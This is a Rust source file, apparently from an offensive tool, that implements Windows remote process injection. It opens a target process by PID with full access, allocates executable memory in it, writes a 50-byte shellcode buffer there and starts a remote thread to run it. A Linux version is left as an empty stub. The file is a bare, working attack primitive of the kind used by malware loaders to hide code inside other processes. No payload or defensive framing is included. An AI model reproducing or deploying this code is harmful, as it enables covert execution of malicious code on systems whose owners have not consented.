#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;

#[cfg(target_os = "windows")]
pub fn process_injection(
    pid: u32,
    shellcode: [u8; 50],
) -> Result<(), Box<dyn std::error::Error>> {
    use windows::Win32::System::Diagnostics::Debug;
    use windows::Win32::System::Memory;
    use windows::Win32::System::Threading;

    // Initializes a process
    let process_handle = unsafe { Threading::OpenProcess(PROCESS_ALL_ACCESS, false, pid) }?;

    // Allocates Memory Space
    let remote_buffer = unsafe {
        Memory::VirtualAllocEx(
            process_handle,
            None,
            shellcode.len(),
            Memory::MEM_RESERVE | Memory::MEM_COMMIT,
            Memory::PAGE_EXECUTE_READWRITE,
        )
    };

    // Writes to buffer
    unsafe {
        Debug::WriteProcessMemory(
            process_handle,
            remote_buffer,
            shellcode.as_ptr() as *const std::ffi::c_void,
            shellcode.len(),
            None,
        )
    }?;

    let _remote_thread = unsafe {
        Threading::CreateRemoteThread(
            process_handle,
            None,
            0,
            std::mem::transmute(remote_buffer),
            None,
            0,
            None,
        )
    }?;

    
    Ok(())
}

#[cfg(target_os = "linux")]
pub fn process_injection(pid: &str) {}
